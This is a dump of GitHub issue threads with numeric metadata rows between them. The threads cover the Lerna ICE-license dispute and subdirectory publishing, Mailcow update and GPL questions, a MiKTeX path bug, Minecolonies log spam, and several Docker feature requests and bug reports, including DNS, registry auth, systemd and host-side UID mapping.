Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered.  The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered.  Also -- if you use Windows -- might I suggest not using it anymore?  Oh boy... @friend The mentions of reverting to the original MIT license has been met with this statement enough times in enough issues, twitter, and reddit. It's not word for word what is said but it is heavily implied by ""you support what ICE does"". No, it's a terrible idea. Any restriction on the license means it's no longer open source. If that's the goal then I think a lot of people will just drop Lerna because of licensing risk. If that's what you want just to make a statement then that's a very poor software decision. It was entirely a trollish act, it's undebatable. 👈 Multiple links The ethical standing is to honor an open license. If lerna doesn't want to be an open source project anymore that's a different story. You cannot restrict anyone. The discussion that everyone seems to be missing is that this change converts Lerna to a proprietary piece of software. Also you're nearing the ethical dilemma of the trolley problem, not exactly, but by saying ""inaction is an action in itself"" is a  poor argument. ICE isn't going anywhere and it probably won't in the next 10 years. Whether that is a positive or negative to whoever reads this is an unfortunate thing we have to deal with. I'm 99.9% sure lerna is nothing special at a government scale, and if ICE (or company in a binding contract with ICE) needed something like lerna they'd build it themselves or simply fork the old version. This license change effectively does nothing to the target. So the discussion is resulting in debating who can virtue signal the strongest. This is a fundamental misunderstanding of what ""open"" means if one cannot see the issue with a non-open license. You will have to fight the literally brick wall of Stallman to change what ""open"" source means if you want to challenge this. Non open licenses greatly increase risk of using the software (depending on the license, the bastardization of the MIT-ICE is a huge risk). If you want to build a company you simply don't pick licenses which can destroy your business in a day. In what realm of reality does a strictly always open door, close? Open is open, closed is closed. Open source is non discriminatory, if you want to go down the path of ""restrictive licensing is open source"" then I don't see the issue with Facebook being able to restrict the people using React under their Patent license. Absolutely zero issues with a single entity controlling who uses the software while claiming to be open source.  Folks who use terms like ""virtue signaling"" might not realize that is incredibly politically charged. Also it's simply not true that restrictive clauses have no precedent in open source work. Everyone screaming that ""this is no longer open source"" needs to realize that A) we are not beholden to the OSI's definition of open source, and B) there is plenty of precedent with Commons Clause, Fair Source, License Zero, and even the original license for JSON (thanks to Mikeal Rogers [formerly of the Node.js Foundation] for pointing that out on Twitter). (source) (source)  So we neither have a compelling reason for Jamie K. to have been kicked nor a compelling reason why the license was reverted. I am shocked. So to recap  All maintainers accepted the original pull request. There's absolutely prior art on doing this sort of license change. Jamie K.'s behavior was apparently considered bad, but not until big companies were involved. No one in charge of this has listed any behavior that violated in the current implemented code of conduct. We're still waiting on an official response to this issue, which was created because of (what is now) a clear attempt at silencing. Multiple employees from a company on the list swooped down to convince a maintainer to revert the change (but not before specifically moving to revert their company's inclusion in the list, awkward).  And the result?  An immense amount of character assassination The gamergate, anti-coc, and hard right crowd have been riled up A fork that will surely not see life longer than a week but will have eaten plenty of valuable engineering time A new surge of engineers who think ethics aren't their problem ESR is talking again   The comments he made on other projects is a violation of the CoC and that's why he was removed. I think that may have been the nth time someone has mentioned that to you. So either you're illiterate or have an agenda.  @friend have you heard the phraee- will somebody please think of the children? That's it. Benevolent @friend is just thinking of the children [traffickers].  @friend did we just say the exact same thing? @friend the image you posted is making me wonder if you have yet acted on @friend's mirror suggestion yet.  I'll just point out a particular sentence from the original licence change  on ""helped"" I think there's quite a bit of needless character assassination going on. Perhaps James has made some unfortunate statements at different times, but in the context of this issue, it hardly looks like he has claimed personal ownership of Lerna or any other open source project.  @friend He did. Here is one where he directly states Lerna is his project.  is one where he claims babel is his project  one  does it keep happening D?  is no character assassination going on, he acted shitty and is being called out on it.  @friend -- no I said for people who are against the change being reverted to look at the fact that they are using MS products -- which makes them hypocrites. If you want to boycott Microsoft, maybe don't use their products -- or even better get off of GitHub. I'm not even sure what you said -- to be honest I stopped reading it after the first sentence.  @friend -- So for all this grandstanding you're doing -- why not delete your GitHub account...seriously -- MS will own GitHub soon. Also -- change your OS from Windows -- if you use that...  I agree that this is the intent, but in practice, that's not the impression I got from reading this thread so far. The majority of comments are either trolling or doing passive-aggressive witch hunts (and sadly I'm seeing this behaviour from both sides of the discussion, mind you). I'm not sure if there needs to be more clarity in terms of an RFC is typically supposed to look like (given that it is, admittedly, a new process in this specific org), which is why I offered my opinions on what is appropriate. If people disagree, they could potentially look at other orgs' RFC processes to get an idea of how one is structured (React and Ember both have RFC processes that could serve as reference, for example). In any case, I think we would all agree that all commenters should be following the basic rule of thumb of ""if a comment would be inappropriate in a technical discussion, it has no place in an RFC discussion either"". I understand this intent, but I have not seen anyone address the concerns about what happens with  non-blacklisted companies being unable to use such licensed software. This concern was dismissed as if it were a problem that did not exist, rather than a significant one (especially for something that is so geared towards big company workflows such as Lerna). For example, @friend (or whoever is the maintainer at any time)'s employer could disallow him from using a hypothetically non-OSI-compliant Lerna at work. If that was the only reason he was working on Lerna, there's a good chance the project would lose its steward and effectively die. Likewise, I might contribute a PR to a MIT-licensed Lerna if I need the fix for work, but I will certainly not do so if I'm not allowed to use it due to licensing issues in the first place. No, the point is that we can't possibly estimate the impact, both positive and negative. We cannot make assumptions that the positives will outweigh the negatives or vice versa. The argument for a non-OSS license boils down to ""something must be done, this is something, therefore it must be done"". No, it must not. Whatever was the latest heated Javascript-related topic of the week on Hacker News is statistically unlikely to be even remotely close to being an appropriate response to an issue that likely no one here has any real life understanding of, other than what they read on some news site while sipping their coffees. It's especially disingenuous to say this must be done, if the person saying so did not even bother to try to research what other things could have been done instead, or what is being done, even. To illustrate the level of myopia here, there was a PR on Jamie's repo to add Uber to the blacklist, despite the fact that Uber is donating rides and meals to families separated by ICE*. As I mentioned in an earlier comment, there's already a well established way of running non-OSS software pay for it. This very discussion is open because the maintainers feel that inclusion of all parties is of utmost importance to the success of this project. They could just tell everyone to go away, or even pull a uws** and they'd be entirely within their rights to do so. Using the privilege of having this forum to argue that the maintainers should adopt a restrictive license is biting the hand that feeds. I think the non-starter here is to suggest that maintainers ought to maintain a project that they themselves may not be able to use under some circumstances.  @friend you and @friend agree, they were being sarcastic......  @friend as I said perhaps he made some unfortunate statements - what I'm trying to say is that if you look at the license change PR where he elaborated, it does not look like he thinks he personally owns the project at the exclusion of anybody else. He did not push the change without review. When people say ""my"" thing, it can mean a lot of different things - its usually not helpful to draw strong conclusions from the use of that word. Looking at the commit history, it does look like he was heavily involved in the early days of Lerna. I assume he means ""my"" in a similar sense - ""Lerna is a project which I was heavily involved in and I share significant responsibility for creating"".  Oh Jesus nevermind -- I'm an idiot I guess joy -- apologies @friend )  @friend I would agree if this were the actual RFC thread, but this is actually just a thread requesting an RFC should exist in the first place. Therefore I don't think it's valid to judge peoples' comments here as what they would have said in an actual RFC. And yet the reason we have OSS licenses as a staple of modern software development today was the continued preaching of outcast mailing list users in the last few decades, and you could extend this to basically any successful political protest as well. There's also lots of not OSS software that is free as in beer. And I appreciate that this is true, but being ""non-OSS"" would not preclude this from happening by default anyway. @friend And yet Stallman's own license is one of the most restrictive and closed-door OSS licenses there is. He just closes the door on a different group of people the group of people that want to use or modify his code without sharing back their changes. There's not a fundamental difference between that and precluding groups for another reason. This is also why I think the OSI page on ""evil"", originated from the JSON license, is fairly crap. I think the ""do no evil line"" is also terrible because it's even less enforceable than what the MIT-ICE license was, but the discussion in OSS around being able to preclude wrongdoers from using code has been very backwards IMO. As I said, Lerna's own license change is not meant to harm ICE by itself in any significant way, it's meant to  Deal with the ethical concerns of allowing a harmful entity to use your code Show other OSS projects that this is a real dilemma and hopefully spark them to discuss and maybe take the same action  If many OSS projects do the same thing, then there could be real, large-scale change over time. None of those show a trollish intent behind the action at all, and in the actual PR that was made, the changes were discussed in a very professional manner, all (at the time available) protocols were followed, and a calm and deliberate reasoning was given. Being terse and (arguably) rude to companies over their using tools he contributed to does not constitute the action being trollish.  @friend Sure, I'm sure you could argue Adolf was a pretty cool guy if you ignore all the other stuff he did and just focus on his gun control policy. 🔥 If you just excuse it as ""unfortunate"" then you're just trying to justify your own opinions. @friend The difference between having a strict license vs claiming it's open. As I said numerous times, if the goal is to have lerna be proprietary that's a different discussion. At the current time, and as far as I know, lerna plans to stay as an open source project. Then none of them are open source anymore. You have collectively made a proprietary license. We're not arguing that so it's a moot point to even mention. He made multiple issues in the same project that all state the same thing, linking to the same resources which are there to incite hatred from a group of people towards a company. See this definition My god, it's exactly what he did.  And we're done. I'm going to spend the rest of the long weekend restoring my mental health. I'll resume my pariah duties on Tuesday. ",203,71,1752,0.25,0.3409090909090909,1242,29,
lerna/lerna/901,0.069235475,lerna,lerna,[Feature] Allow custom publish subdirectory,9018,106,78,0.6,9," Many libraries in the Angular ecosystem publish to NPM from a subdirectory that was cooked during the build process. The process is usually as followed - build the library in a subdirectory (i.e  directory) - copy package.json, license and readme to the  directory - do some package.json cleanups in the  directory (delete devDepedencies, move dependencies to peerDependencies, remove scripts...) - npm publish from the  directory.  I understand that it is not a common technique for node.js package developers but i think it is common for web package developers and my libraries uses the same technique..  While embedding  into our shared packages monorepo - [kaltura-ng]( I read a lot of issues in lerna and googled about this topic. I read carefully the conversation of issue #91 and even used the same subject with my issue. Unless I missed new issues that address this feature it was marked as 'wontfix' with a recommendation to use the 'package.jsonfiles' array instead.  The reasons for using this approach instead of  array are - Many known libraries in the Angular ecosystem does it ([angular/angular]( [ReactiveX/rxjs]( [cyclejs/cyclejs]( so they must have a reason. - There is a lot of hoo-ha/complexity with the way node.js resolve modules  for the **web projects** since during the bundling process you **must** refer to the same instance of the library. Unless the bundler (typescript, webpack etc...) provide a hack/workaround/solution to force the library to use its' own node_modules, it will not work. Publishing from sub-directory works just because the  not exists. - During development if the symlink is done against the root, when you import nested class which was not exported in the main index, you will need to refer to the  as part of the path . but once you publish from  folder directly, you should somehow fix the pass by removing the  during the tranpiling which is not a valid option. - The libraries being used as dependencies during development should be assigned as peerDependencies at runtime because you want the application to provide them.  so to recap, we cannot just publish the package with a  folder, we need to publish from  directly  There are some caveats that I could think about with my suggested approach 1. The dist folder must exists with a package.json inplace before the  process symlink the folders.  2. The build process should not delete the 'dist' folder, instead it should just clear its content otherwise the symlink of dependent libraries will be broken.  IMO those two caveats are manageable as 1. we can use a preinstall script to create the folder and a simple package.json file (with at least 'id','name'). 2. the build scripts should clear the folder content instead of  the folder itself.  ## Expected Behavior   when bootstrapping/publishing a package the package.json is being queried for the following config    if this config exists, it will symlink to that folder during bootstrap command and will publish from that folder during  publish command  using the 'config' attribute allow using the same configuration both in  and in other [node scripts]( already modified the 'bootstrap' command in a fork [esakal/lerna]( I didn't create a PR yet because I'm missing the 'publish' command. I will be happy to continue my work if you are going to consider this feature.  You can see it in action in our repo -  [kaltura-ng](   **NOTE** - your yarn version should be 0.24.6 and above  ## Current Behavior   n/a   ## Your Environment     Executable Version      2.0.0-rc.5    v0.24.6      OS Version     macOS El Capitan 10.11.6     Hi, I have a same problem in a project developed with a lot of Angular 4 libraries. If dist folder cant' be symlinked directly, the services don't be injected correctly. I dislike this way proposed by angular (define a package in dist). But if customization of package dir can't be defined, Lerna can't be used with an angular project.  I recently tried using Lerna for the first time and immediately ran into this issue. Any heavy Typescript development is going to get hamstrung by the omission of this NPM feature.  Same issue here I ran into this problem, would love to get this feature, I am even ready to do a PR. @friend any thoughts?  Have the same problem here, I’d love to have this feature, and I am willing to do a PR. @friend what are your thoughts?  As far as I know this is the only way to accomplish ""flat"" package structure (without the  or  section in the import path) unless skipping / directories entirely, which isn't practicable if your source requires transpilation. Let's say I want to import only the  module from the  namespace inside my , what I would like it to look like is If the source is ts/jsx/esnext etc, the recommended way of distributing the package is to transpile it to a  directory (""npmDistDirectory"" in @friend's proposal), include  and publish. This doesn't seem to be possible with lerna at this moment, which is a pity. Instead I will need to transpile it to , reference it from the  prop in  and then accept the following import After spending precious time on your API design, naming convention etc, this is a bitter tradeoff.  I don’t understand why this “flat” package structure is better than just another npm package. “big-obese-monolith” packages are an anti-pattern in npm. If you want to expose submodules directly, extract them into a separate package. Literally the reason Lerna was created in the first place.  @friend I will not go into argument whether x is better than y - most often I am wrong. But if we ignore my poor choice of lorem-ipsum name (we can call it something else, such as ""tiny-lodash""), I can't really see why lerna should hinder the author from using a nested structure within a package and at the same time provide ""semantic imports"". I came here to evaluate lerna as a tool for managing JavaScript projects with multiple packages, not as a tool to limit me on how to structure the internals of my packages (whether good or bad).  In my experience, as well as observation of community packages over many years, coupling consumption of a given export to the literal directory structure of a tarball is an extremely hostile anti-pattern. Especially nowadays with ES module exports and whatnot combined with tree-shaking module bundlers, there’s really no fundamental necessity for false-basedir publishing. Lerna is designed around the way npm works. Packages are published from the same directory as the package.json, and construct their tarball from metadata contained therein. Publishing from a different directory with a modified dependency tree is not idiomatic npm, and lerna will not support it.  This will be a major limitation for TypeScript and Angular developers, and in fact some people using lerna with typescript had to do their own publish, or patch the existing implementation.  I myself want to publish from a subdirectory which does contain a  for several reasons; 1) I don't want to transpile my TS in the  folder because I'll end up having a messy file system. , , ,  all next to each other, and than to  after build will be a total mess. 2) I want to following Google's Angular Package format  Seperation of concerns, why should I have my  files within the same folder of the ? My folder structure ♠bash -- my-lib ---- package.json ---- src ------ index.ts ----dist ------ package.json ------ index.d.ts ------ index.metadata.json ------ esm2015 -------- index.js ------ esm5 -------- index.js ------ bundles -------- index.js So in reality i can publish from a subfolder as I do have a  Author of several typescript modules here who has hit the exact same issue, all my modules publish from a  folder. Wish I'd known this before starting to use lerna! Would love this feature to be implemented, but will probably have to switch to something else instead now.  I fail to see what typescript has to do with this non-idiomatic subdirectory pattern. You can publish npm modules with transpiled code and typings under  just fine, no mangling of package.json required.  That won’t  work if you’d need secondary entry points like @friend/my-lib/testing On Fri, 29 Dec 2017 at 1645, Daniel Stockman notifications@friend.com wrote  For those that are still trying to get ""flat-pack"" imports working  I was able to solve it by leveraging the , , and  scripts that were added in  me I got it working by - Disabling NPM publishing during the lerna publish command  Performing my linting and build during the  NPM script (or before) which would be built into a  folder Copy necessary files into the  folder during the  NPM script and then call . This is handled in a gulp file but I've simplified below. The  version has been bumped prior to the  script being called is only called if you do not include the  command to lerna publish     I still think a config option for  could be beneficial since it would allow a consumer to leverage the  lifecycle-hook which seems a little more intuitive.  that's why angular repos not using lerna ",40,61,390,0.13333333333333333,0.26666666666666666,163,4,
mailcow/mailcow-dockerized/2465,0.0866553425,mailcow,mailcow-dockerized,Updating lots of changes.,5740,66,42,0.4,6,"In my cow I have made many changes and added new options, not knowing how to best update them with a new code on GitHub, without break other users who will have this issue how will fix it. Thank.  You just stated that you don't know that's not a question; it's a statement. If your question is how to actually do this it would help to know how much experience with git-based development you have, so we can better assess on where to start explaining. If you've got enough experience andryyy's comment should help you out.  i don't think you underztond  Ok, @friend can help you out; he's the maintainer 😸.  Actually, if you made changes to the code itself there should be an open repo (or otherwise publicly available current version of the code) of this per the license of this project. Where can we inspect this code? I see no open repositories under your GitHub account.  I think he asking how to update Mailcow if you have done lots of changes to the code, I might wrong don't want to sound rude but there seem to be a bit of language barrier.  @friend Oooh, ok. Well, as long as only configuration stuff is involved, there should be no issue updating, I think. (You should always backup anyway.) If functionality was added, he is bound by the license to make his code publicly available, though. I can't speak for @friend but in his stead I wouldn't want to support anyone who is violating the license.  Did ./update.sh it stoped working  This is the point in time where you save the logs of the update,restore your backup and show us what the logs say. Though I don't know if anyone might want to help you as long as you're violating the license.  I don't think this should break anything, but we still can't help without some diagnostic output... Follow the issue template and if you think your rspamd scores make more sense you should create a PR.  @friend I don't think adding new functionality to Mailcow would count as a license violation even if they don't release the code as long as they are not distributing it.    Please stop claiming that @friend violates the license. He's most likely not doing that. Simple stuff like the Dockerfiles and configurations is too trivial to be copyrightable, so the license mainly applies to  the scripts, web UI, etc. Besides that, the GPLv3 only requires you to provide the code if you redistribute the software (e.g. if someone started selling Mailcow for other people to run on their own servers), not if you are only running it (either for your own use or as a hosting company that provides managed Mailcow instances). This is different from the AGPLv3, which, for example, requires you to provide the code as soon as you are allowing someone to use the software over the network. These kinds of comments indeed do not help. Please provide a full explanation of your problem and all relevant logs. When you created a new issue, the template actually asked you to do precisely that.  Huh. ) Okay. Thought he wants to contribute code.  @friend @friend As stated in  is no mention that you don't need to make the code available after a modification of the code if you're only using it for yourself. Actually it suggests otherwise. That's why I didn't ever dig further into this. On the other hand we have this  means ""conveying"" here, as per the GPL  actually you're wrong. We have JavaScript as part of this repo. And now see this  we use Ajax calls the javascript part of the code is explicitly considered NOT to be trivial as per the link provided. Since you're making part of the GPL code available directly to the public just by visiting the mailcow site, you WILL have to disclose any changes to the code IMHO. Correct me with a reliable source please, if I missed something. I'm now even more confused about @friend's comment here  though 😖.  I don't think andryyy care if someone modify or add stuff to Mailcow unless they are posting screenshot or asking for help to fix issue caused by their modification. Even if andryyy did wanted ever bit of code from a user that  modified their Mailcow install it not like he's going to even know about it unless the person messages him saying I've modified your code you want a copy.  That's why I mentioned  where he actually asked for it.  I have close why still messageing  Did anyone teach you manners if allof (header contains ""X-GitHub-Sender"" ""Hickstead"") { discard; } that shoud keep my inbox clear of you.  I'm willing to believe there was a big language-barrier problem (maybe auto translate) and all the talk of violating licenses may have scared Hickstead, so his comment about still messaging may not have been meant the way it came across. 👍  Sorry, didn't want to scare anyone or get offtopicky. ( I'd be happy if anyone could cite something that disproves what I found out, though, just for clarity, because that's how I always interpreted Mailcow to behave in context of GPL. plus one  Your interpretation is probably a bit strict, @friend. Commonly one only insists on publishing the source code if someone provides (usually by selling) the software to someone else to run on their own computer. So all internal use is not affected. It's unclear to me whether the redistribution of the JS code also requires the publication of modifications to the server-side code. My guess is no (as the license also applies to each file individually, one can redistribute them individually), but that question can basically only be answered by a lawyer. I already locked this discussion, but since you are team members, you can continue commenting here. I just ask that we stick to the actual technical questions instead of discussing nitpicky licensing details that none of us is an expert on.  Agreed. Thanks for clarifying. plus one ",25,6,176,0,0.4,123,1,
MiKTeX/miktex/163,0.12242819499999999,MiKTeX,miktex,I installed MiKTeX under win10 and the path of the bin directory is set with wrong slashes:  C:\Users\me\AppData\Local\Programs\MiKTeX 2.9\miktex/bin/x64,785,8,4,0.75,0,"Please note we will close your issue without comment if you delete, do not read or do not fill out the issue checklist below and provide all the required information. Checklist  [ ] I am reporting a bug others will be able to reproduce [ ] I have installed the latest MiKTeX updates [ ] I have checked the MiKTeX log files  Please replace this section with the required information  step-by-step reproduction instructions input files which are necessary to reproduce the bug your observations (command output, screenshots, ...) relevant log file snippets   @friend  Why is it invalid? I need a solution to this problem. There is no way to edit this path, it is set by MiKTeX...  This is an invalid report  You haven't checked the log files You didn't provide the required information  ",2,0,26,0,0,24,1,
ldtteam/minecolonies/2094,0.11617921,ldtteam,minecolonies,Massive log file.,938,3,41,1,0,"Minecolonies version First detection  forge-1.12.2-14.23.1.2665-universal + minecolonies-universal-1.12.2-0.8.6905 ( and other version ) Lastest test  forge-1.12.2-14.23.1.2604-universal + minecolonies-universal-1.12.2-0.8.7200 Expected behavior No log, reduct log to minimum, place a option in config file for stop log, place this log in separated file.  run /mc colonies rsResetAll in Version 1.12.2-0.8.7193 ( read in description ) Same problem. Massive LOG file. 2531 entry in one second in file fml-junk-earlystartup.log [120716] [Server thread/DEBUG] [minecolonies] Attempting to find a Factory with Primary com.minecolonies.api.colony.requestsystem.factory.FactoryVoidInput -&gt; com.minecolonies.api.colony.requestsystem.data.IRequestSystemBuildingDataStore [120716] [Server thread/DEBUG] [minecolonies] Found matching Factory for Primary input type. Log file  Reducted file from a server start to stop. fml-junk-earlystartup.log ",0,0,85,0,0,42,0,
moby/moby/10248,0.12358285,moby,moby,Docker embarrasing slow on execution,1687,4,62,0,3,"Running my own image on a CentOS 7 host, clean installation, no other jobs running is embarrassing slow. docker run -p 1202012020 zopyx/xmldirector-plone takes in the range 5 to 10 minutes under Docker control. Running the same code on same virtual machine usually takes less than one minute. The image starts eXist-db, pre-allocates the CMS Plone and starts it. The related Dockerfile is here  uses this as base image  the load of the VM goes over the top and climbs up to 10  [ajung@friend ~]$ uname -a Linux docker.zopyx.com 3.10.0-123.el7.x86_64 #1 SMP Mon Jun 30 120922 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux [ajung@friend ~]$ docker version Client version 1.4.1 Client API version 1.16 Go version (client) go1.3.3 Git commit (client) 5bc2ff8 OS/Arch (client) linux/amd64 Server version 1.4.1 Server API version 1.16 Go version (server) go1.3.3 Git commit (server) 5bc2ff8 [ajung@friend ~]$ docker -D info Containers 3 Images 62 Storage Driver devicemapper  Pool Name docker-2531-201327949-pool  Pool Blocksize 65.54 kB  Data file /var/lib/docker/devicemapper/devicemapper/data  Metadata file /var/lib/docker/devicemapper/devicemapper/metadata  Data Space Used 3.474 GB  Data Space Total 107.4 GB  Metadata Space Used 4.448 MB  Metadata Space Total 2.147 GB  Library Version 1.02.82-git (2013-10-04) Execution Driver native-0.2 Kernel Version 3.10.0-123.el7.x86_64 Operating System CentOS Linux 7 (Core) CPUs 3 Total Memory 3.704 GiB Name docker.zopyx.com ID 2CWZEWWZTNZTNHN7H4VEJOENPQZGXVJGAJMH2PVKJYOXE4UY Debug mode (server) false Debug mode (client) true Fds 23 Goroutines 39 EventsListeners 0 Init Path /usr/bin/docker Docker Root Dir /var/lib/docker Username zopyx Registry [",0,0,115,0,0,157,0,
moby/moby/16417,0.06673585,moby,moby,Would the docker community  like to accept new performance/stress/stability test cases?,816,5,6,0,0,"Currently, only functional test cases are included in the docker community. I plan to create some new performance/stress/stability test cases. For example, performance tests are as follow(included but not limited to)  CPU usage, Disk IO, network IO, TCP/IP bandwidth and latency,concurrent container quantity. Benefits are as follow. (1) They can provide docker users with performance reference. For example, a user need to deploy a server with docker. If the server's memory consumption figure is more than the benchmark data, the user can know much memory is need. (2) We can use them to track performance history data for each commit to find which patch leads to the increase or the decrease of performance data. But I wonder if the community would like to accept them. What is the attitude the docker community? ",4,0,28,0,0,24,1,
moby/moby/17195,0.08464951,moby,moby,Proposal: docker embedded DNS server,847,8,3,0,0,"There are numerous open issues in regards to docker and DNS handling within containers (#17190 #16619 #15978 #14627 #15819 and likely many others which I was fuzzy on) One solution I think which would solve all these issues would be if docker acted as a DNS server. It would answer lookup requests for linked containers, and when the request isn't for a linked container, it would forward it upstream (to the host's name servers). The  file inside the container would then be static, containing only the container itself. We could also not touch  at all, and leave the container's entry to DNS. This would allow image builds to manipulate the file and persist the changes. For performance, it would probably be good if docker cached the upstream DNS records. Records come back with a TTL, so docker should cache the record until this TTL expires. ",9,0,25,0,0,28,0,
moby/moby/18264,0.064545665,moby,moby,Using monochrome icon?,1445,21,18,0,4,"Hello, I'd like to know if is it allowed in a commercial product to use a monochrome version (for example  to refer to Docker. I'm asking this because I need to use this icon in a narrow space (about 20x20px) and the original icon when scaled down looks blurred, and, in your documentation, you ask developers to use the original icon with even the ""Docker"" text below it. Thanks.  Just as a heads up, it appears that  has been updated. There's an excellent simplified logo that looks great.  Ah, yes; I do see that there's a requirement to keep the  name in the logo, so looks like it's still not allowed (well, without written permission I guess) to use just the Whale icon &lt;img width=""471"" alt=""screen shot 2017-07-13 at 13 48 26"" src="" Too bad one can't even change the plain logo's color to white or black so it matches the hundreds of other logos legally provided for icon/footer use.  @friend sorry for that, I understand it's frustrating; also not something I can influence. There's a section that mentions exceptions - could be worth reaching out; &lt;img width=""920"" alt=""screen shot 2017-07-13 at 21 48 29"" src="" @friend Thank you for pointing that out. The best solution would be for Docker to add some of those logos to the package they provide. But I understand they wouldn't add the black and white versions because of the risk of those being used more than the ones they already provide. I'll send the email with the artwork. ",7,0,69,0,0,23,0,
moby/moby/18569,0.02592367,moby,moby,Docker client does not handle 401 Unauthorized response codes from registry correctly,412,0,4,0,1,"Docker (1.9.1) only checks for 401 HTTP status code on  but it will not attempt authentication on later 401 status response codes. My use case our registry needs to allow unauthenticated pulls (therefore will return 200 on ), but it requires authentication on ""push"". Docker client version 1.9.1 Used registry  client will print ""&lt;nil&gt;"" on the console instead of attempting authentication (as it should).  ",4,0,22,0,0,8,0,
moby/moby/22285,0.17654967,moby,moby,ISSUE: Can't get systemd to run with 1.11,410,7,7,0,1,"I've been running a few hundred containers with systemd in them since 1.7. The flags required has changed a little bit. In 1.10 I was adding , , and . With the same flags, it doesn't work in 1.11. With  it works. With  it does not work. Here's a dump of the system Thanks for the help! FYI This is the only thing I could find about the issue while Googling, and it suggests something indeed did change in 1.11 ",1,0,18,0,0,15,1,
moby/moby/22415,0.0668130685,moby,moby,Add the ability to map containers to a user host-side,9480,94,65,0,5,"Before getting into the details, I want to point out that I suspect a feature like what I'm about to suggest could solve many permission related snags when using Docker. So as to prevent this suggestion from getting mired in philosophical objections, this ticket is not advocating permanently storing credentials inside a container.  I don't do that and I don't suggest anyone else do it either!  tldr; The current method of UID spoofing inside of a container via  has limitations that end up mandating entire ecosystems of one-offs and very problematic workarounds to massage container state into the right frame of mind.  This is worsened by the fact that the need to perform these workarounds is influenced by what platform you are calling Docker from. The feature I'd like to request is to have a flag added to  (and equivalents) that tells Docker to map all filesystem operations that a container performs to a specific user host-side.  This is very different to  which simply sets the user of the process that runs inside the container. If you're interested in an extended explanation, read on!  Rationale We've all heard about people having issues with temporarily binding SSH credentials and similar  &amp;  related difficulties. Something that I've noticed when using Docker on OSX and Windows however is that I'm actually freed from the challenges of ensuring my ephemeral development containers (my primary use case) aren't writing files to the filesystem as root!  This is owed to the fact that they both rely on a variety of bridges back to the native platform's filesystem. One non-exclusive example is when trying to forward either an SSH socket or the SSH directory on a Linux host, because SSH insists on proper home directories, I've been unable to get secure connections working without having to make my container aware of the environment it is running in!  The best I've been able to dream up is bind mounting ,  and  into the container.  Which is exactly as horrible as it sounds, but also my only choice given that I don't know what uids will be right for the host filesystem.  This clearly runs against Dockers attitudes towards portability. Another more common example would be when files are created by the container, if the bound filesystem is ext or otherwise linux-compatible, the UID of files is set to root (or whoever I run my container as).  On Linux, in order to not blast my filesystem with files having UID/GID 0, I have to tell my containers to run their processes as my current user via . This might work in trivial scenarios, but again ends up falling apart in situations where the user system inside of the container is different to the host or the binaries being run enforce  directory requirements like SSH above.  No host is likely to ever have a reliable way to influence the user system inside the container.  This is especially true when using images produced by third parties. So, I currently am stuck avoiding the complexity by staying as root.  Everything works because all containers have a root user fully configured.  But now without any better option, all Docker containers that want to avoid being polluted with hacks are forced to write files as UID 0! As I mentioned above, switch over to Windows or OSX and this problem goes away because they don't share the same users as the container and the filesystems aren't compatible.  Instead, vboxsf, samba and other drivers are actually emulating the feature I'm requesting here! So, this clearly identifies the fact that while it's nice to control who the container runs its process as, it would actually be more desirable to optionally map the uid (and gid?) flag for any changes to the filesystem from the container, host-side. All the while, still allowing the container to function as whoever it needs to be internally. This jives with the philosophy that Docker containers should be portable and require zero awareness of the environment that is running them.  Indeed if you examine the nature of this suggestion, it's conceptually parallel to binding ports and bind mounting filesystems. We need a way to bind users as well.  @friend are you are of any progress or discussion that has been around this since your post?  Nope, and I was even thinking about this issue today.  IIRC, @friend agreed with the value behind such a feature, might have been advocating for it internally (correct me if I'm wrong 😅). This is probably one of the more glaring oversights in the docker platform and in a strange twist, keeps me preferring to work with it on macOS/Windows instead of natively on linux! Feel free to retweet, this issue is as old as my daughter!  If the main issue is to have the ability to bind-mount files from your host into a container, then this is largely the same issue as;   User namespaces - Phase 2  Add ability to mount volume as user other than root  And comes down to the ability to remap user-ids inside the container. This might be possible with a kernel that supports shiftfs or a FUSE filesystem. @friend did some work on something in this area in  (implementing a FUSE driver to do uid/gid remapping), and in a WIP pull request to use it for userns;  Doesn't that end up requiring the container to have special setup? The idea here is that regardless of what the container chooses to do to the filesystem it sees, any writes coming out of it are abstracted to specific uid and/or gid.  It's not something that should be (or could be) enabled by default, as;  docker won't know what mapping to make (i.e. wouldn't know what local uid/gid you want to map to which uid/gid inside the container) by default ignoring/mapping uid/gid means that a non-privileged user inside the container would get full access to bind-mounted files from the host (files which could be accessible to certain users only).  For Docker Desktop (Docker for Mac / Docker for Windows), the ""ignore ownership"" feature was implemented because Docker Desktop is targeted at developer use-cases, not for production (in production situations, giving a container access to files on the host is especially not desirable)  I'm not sure I understand the distinction ~""people dev on Windows/macOS"" as I'm sure plenty of people develop on linux as well.  If that's really an explanation for the difference in behaviour, they surely need some equivalent that is easy to use. The mappings should be configured per volume.  So if I bind a volume to a container, I should be able to set a uid and/or gid that all write operations to that volume map out to on the host.  Internally the container will retain its own behaviour, but I can't have containers that write to uids and gids that might not even be configured on my host system. There is clearly a missing abstraction here.  The missing abstraction is this is simply not possible on Linux without fuse. Docker for Mac uses fuse to do this, and it's horribly slow for most use cases.  @friend - Sorry, can you elaborate?  I might not be following on that one, why would FUSE be necessary? Really, what this ticket represents applies regardless of what the current state of things is.  I don't think it's at all a stretch to say that my  and  can't possibly be expected to harmonize with every container and every permutation of them I can end up running.  Obviously the same applies for the containers own assumptions internal to themselves as well. As a practical but still contrived example If I'm running on a system and one container writes as , another uses  and another is using , they will all write as whatever the corresponding uid maps out to internally.  To the host though, those uids could end up being anything.  Worse still, between containers, you have a whole other set of permutations to deal with. To me, it seems like the only possible answer here is that we need some way during instantiation to abstract the filesystem operations that originate from within the container to the local system.  More importantly, this has to be possible without having to put that information in the containers themselves. Ideally Each container is responsible for its own security abstractions and when configured, have all 